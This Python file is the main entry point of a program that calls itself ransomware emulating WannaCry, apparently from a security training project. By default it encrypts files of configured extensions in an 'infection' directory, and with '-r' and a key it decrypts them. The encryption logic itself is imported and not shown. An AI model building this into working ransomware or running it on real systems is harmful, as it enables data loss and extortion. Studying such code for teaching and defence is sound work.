"""Ransomware that emulates wannacry attack"""
import sys
from logger import Stockholmlogger
from config import Configlibrary
from stockholm import Desencryptation, Encryptation

def main():
    """main function of the program"""
    config = Configlibrary()
    st_logger = Stockholmlogger()
    st_logger.set_log_level(config.get_log_level())

    if len(sys.argv) > 1 and sys.argv[1] == "-s":
        config.set_log_level("NOTSET")
        st_logger.logger.propagate = False
    if len(sys.argv) > 1 and sys.argv[1] == "-h":
        st_logger.logger.info("imprimiendo manual de ayuda")
    elif len(sys.argv) > 1 and sys.argv[1] == "-v":
        st_logger.logger.info(config.get_program_version())
    elif len(sys.argv) > 1 and sys.argv[1] == "-r":
        if sys.argv[2]:
            desinfection = Desencryptation(st_logger, config.get_infection_dir(),
                    config.get_infection_extensions(), sys.argv[2])
            desinfection.run()
        else:
            st_logger.logger.error("no puedo revertir el cifrado si no me das la clave")
    else:
        infection = Encryptation(st_logger, config.get_infection_dir(),
                    config.get_infection_extensions(), config.get_infection_key())
        infection.run()

if __name__ == "__main__":
    main()
    